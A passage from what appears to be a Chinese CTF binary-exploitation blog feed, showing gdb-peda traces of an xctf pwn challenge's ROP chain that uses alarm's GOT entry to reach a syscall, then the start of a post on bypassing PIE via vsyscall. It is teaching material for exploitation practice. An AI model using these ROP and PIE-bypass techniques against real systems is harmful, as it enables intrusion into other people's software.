align="left"></td></tr><tr><td align="right">1</td><td align="center">sys_write</td><td align="center">unsigned int fd</td><td align="center">const char *buf</td><td align="center">size_t count</td><td align="center"></td><td align="center"></td><td align="left"></td></tr><tr><td align="right">2</td><td align="center">sys_open</td><td align="center">const char *filename</td><td align="center">int flags</td><td align="center">int mode</td><td align="center"></td><td align="center"></td><td align="left"></td></tr><tr><td align="right">59</td><td align="center">sys_execve</td><td align="center">const char *filename</td><td align="center">const char *const argv[]</td><td align="center">const char *const envp[]</td><td align="center"></td><td align="center"></td><td align="left"></td></tr><tr><td align="right">60</td><td align="center">sys_exit int</td><td align="center">error_code</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="left"></td></tr></tbody></table><h3 id="用alarm-got代替alarm-plt"><a href="#用alarm-got代替alarm-plt" class="headerlink" title="用alarm_got代替alarm_plt"></a>用alarm_got代替alarm_plt</h3><p><strong>一句话：调试是检验真理的唯一标准</strong><br>在使用alarm_plt作为ret对象时：</p><pre class=" language-java"><code class="language-java">   <span class="token number">0x4006f3</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">19</span><span class="token operator">></span><span class="token operator">:</span>        mov    BYTE PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x20098e</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x1</span>        # <span class="token number">0x601088</span> <span class="token operator">&lt;</span>completed<span class="token number">.6963</span><span class="token operator">></span>   <span class="token number">0x4006fa</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">26</span><span class="token operator">></span><span class="token operator">:</span>    repz ret    <span class="token number">0x4006fc</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">28</span><span class="token operator">></span><span class="token operator">:</span>    pop    rax<span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x4006fd</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">29</span><span class="token operator">></span><span class="token operator">:</span>    ret       <span class="token number">0x4006fe</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdx   <span class="token number">0x4006ff</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">31</span><span class="token operator">></span><span class="token operator">:</span>    ret       <span class="token number">0x400700</span> <span class="token operator">&lt;</span>frame_dummy<span class="token operator">></span><span class="token operator">:</span>    mov    edi<span class="token punctuation">,</span><span class="token number">0x600e18</span>   <span class="token number">0x400705</span> <span class="token operator">&lt;</span>frame_dummy<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token operator">:</span>    cmp    QWORD PTR <span class="token punctuation">[</span>rdi<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13628</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4005f0</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13630</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a3</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">99</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdi<span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13638</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x3</span> <span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13640</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a1</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">97</span><span class="token operator">></span><span class="token operator">:</span>    pop    rsi<span class="token punctuation">)</span><span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13648</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x601260</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13650</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13658</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4006fe</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdx<span class="token punctuation">)</span><span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13660</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x64</span> <span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x00000000004006fd</span> in <span class="token function">__do_global_dtors_aux</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token operator">-</span>peda$ </code></pre><p><strong>ni</strong></p><pre class=" language-java"><code class="language-java"><span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x4005f0</span> <span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a32</span><span class="token punctuation">]</span>        # <span class="token number">0x601028</span> <span class="token operator">|</span> <span class="token number">0x4005f6</span> <span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x2</span> <span class="token operator">|</span> <span class="token number">0x4005fb</span> <span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>    jmp    <span class="token number">0x4005c0</span> <span class="token operator">|</span> <span class="token number">0x400600</span> <span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a2a</span><span class="token punctuation">]</span>        # <span class="token number">0x601030</span> <span class="token operator">|</span> <span class="token number">0x400606</span> <span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x3</span> <span class="token operator">|</span><span class="token operator">-</span><span class="token operator">></span>   <span class="token number">0x7f8b0f452845</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token operator">:</span>    syscall        <span class="token number">0x7f8b0f452847</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">7</span><span class="token operator">></span><span class="token operator">:</span>    cmp    rax<span class="token punctuation">,</span><span class="token number">0xfffffffffffff001</span>       <span class="token number">0x7f8b0f45284d</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">13</span><span class="token operator">></span><span class="token operator">:</span>    jae    <span class="token number">0x7f8b0f452850</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span>       <span class="token number">0x7f8b0f45284f</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">15</span><span class="token operator">></span><span class="token operator">:</span>    ret                                                                  JUMP is taken<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13630</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a3</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">99</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdi<span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13638</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x3</span> <span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13640</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a1</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">97</span><span class="token operator">></span><span class="token operator">:</span>    pop    rsi<span class="token punctuation">)</span><span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13648</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x601260</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13650</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13658</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4006fe</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdx<span class="token punctuation">)</span><span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13660</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x64</span> <span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span><span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13668</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x400600</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a2a</span><span class="token punctuation">]</span>        # <span class="token number">0x601030</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x00000000004005f0</span> in alarm<span class="token annotation punctuation">@plt</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token operator">-</span>peda$ </code></pre><p><strong>这里的plt使用了[]，就可以取0x601030表地址上的值作为jmp目标</strong></p><p>在使用alarm_plt作为ret对象时：</p><pre class=" language-java"><code class="language-java"><span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x4006fd</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">29</span><span class="token operator">></span><span class="token operator">:</span>    ret       <span class="token number">0x4006fe</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdx   <span class="token number">0x4006ff</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">31</span><span class="token operator">></span><span class="token operator">:</span>    ret       <span class="token number">0x400700</span> <span class="token operator">&lt;</span>frame_dummy<span class="token operator">></span><span class="token operator">:</span>    mov    edi<span class="token punctuation">,</span><span class="token number">0x600e18</span>   <span class="token number">0x400705</span> <span class="token operator">&lt;</span>frame_dummy<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token operator">:</span>    cmp    QWORD PTR <span class="token punctuation">[</span>rdi<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60548</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x601028</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7fdc88808845</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token operator">:</span>    syscall<span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60550</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a3</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">99</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdi<span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60558</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x3</span> <span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60560</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a1</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">97</span><span class="token operator">></span><span class="token operator">:</span>    pop    rsi<span class="token punctuation">)</span><span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60568</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x601260</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60570</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60578</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4006fe</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdx<span class="token punctuation">)</span><span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60580</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x64</span> <span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x00000000004006fd</span> in <span class="token function">__do_global_dtors_aux</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token operator">-</span>peda$ </code></pre><p><strong>ni</strong></p><pre class=" language-java"><code class="language-java">RDI<span class="token operator">:</span> <span class="token number">0x601058</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x67616c66</span> <span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span>RBP<span class="token operator">:</span> <span class="token function">0x4141414141414141</span> <span class="token punctuation">(</span><span class="token string">'AAAAAAAA'</span><span class="token punctuation">)</span>RSP<span class="token operator">:</span> <span class="token number">0x7ffcc4e60550</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a3</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">99</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdi<span class="token punctuation">)</span>RIP<span class="token operator">:</span> <span class="token number">0x601028</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7fdc88808845</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token operator">:</span>    syscall<span class="token punctuation">)</span>R8 <span class="token operator">:</span> <span class="token function">0x7fdc88d224c0</span> <span class="token punctuation">(</span><span class="token number">0x00007fdc88d224c0</span><span class="token punctuation">)</span>R9 <span class="token operator">:</span> <span class="token number">0x0</span> R10<span class="token operator">:</span> <span class="token number">0x0</span> R11<span class="token operator">:</span> <span class="token number">0x246</span> R12<span class="token operator">:</span> <span class="token function">0x400630</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span><span class="token operator">:</span>    xor    ebp<span class="token punctuation">,</span>ebp<span class="token punctuation">)</span>R13<span class="token operator">:</span> <span class="token number">0x7ffcc4e605c0</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> R14<span class="token operator">:</span> <span class="token number">0x0</span> R15<span class="token operator">:</span> <span class="token number">0x0</span>EFLAGS<span class="token operator">:</span> <span class="token function">0x10202</span> <span class="token punctuation">(</span>carry parity adjust zero sign trap INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>code<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x601028</span><span class="token operator">:</span>    mov    BYTE PTR <span class="token punctuation">[</span>r8<span class="token operator">+</span><span class="token number">0x7fdc88</span><span class="token punctuation">]</span><span class="token punctuation">,</span>r8b   <span class="token number">0x60102f</span><span class="token operator">:</span>    add    BYTE PTR <span class="token punctuation">[</span>rax<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dh   <span class="token number">0x601032</span><span class="token operator">:</span>    or     DWORD PTR <span class="token punctuation">[</span>rax<span class="token operator">+</span><span class="token number">0x7fdc</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0xfffffff0</span>   <span class="token number">0x601039</span><span class="token operator">:</span>    push   rdx<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60550</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a3</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">99</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdi<span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60558</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x3</span> <span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60560</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a1</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">97</span><span class="token operator">></span><span class="token operator">:</span>    pop    rsi<span class="token punctuation">)</span><span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60568</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x601260</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60570</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60578</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4006fe</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdx<span class="token punctuation">)</span><span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60580</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x64</span> <span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span><span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60588</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x400600</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a2a</span><span class="token punctuation">]</span>        # <span class="token number">0x601030</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> valueStopped reason<span class="token operator">:</span> SIGSEGV<span class="token number">0x0000000000601028</span> in <span class="token function">_GLOBAL_OFFSET_TABLE_</span> <span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这里就直接将got表地址当作ret目标，而不是地址上的值（真正的地址）</p><p>参考资料：<a href="https://adworld.xctf.org.cn/media/uploads/writeup/4b6e244402fe11ea9f5700163e004e93.pdf" target="_blank" rel="noopener">https://adworld.xctf.org.cn/media/uploads/writeup/4b6e244402fe11ea9f5700163e004e93.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PIE绕过-vsyscall</title>
      <link href="/2020/08/29/pie-rao-guo-vsyscall/"/>
      <url>/2020/08/29/pie-rao-guo-vsyscall/</url>
      
        <content type="html"><![CDATA[<p>前面我学习了一种pie绕过方法，然而那种方法有很大的局限性（没那么简单的题<del>~</del>），今天我又学到了一种方法——-vsyscall</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>使用cat /proc/self/maps指令 来查看当前的函数库，堆栈的地址（我的aslr开启）<br>第一次：</p><pre class=" language-java"><code class="language-java">01f76000<span class="token operator">-</span>01f97000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                                  <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>7f2c892ed000<span class="token operator">-</span>7f2c89780000 r<span class="token operator">--</span>p <span class="token number">00000000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">132431</span>                     <span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>locale<span class="token operator">/</span>locale<span class="token operator">-</span>archive7f2c89780000<span class="token operator">-</span>7f2c89967000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token 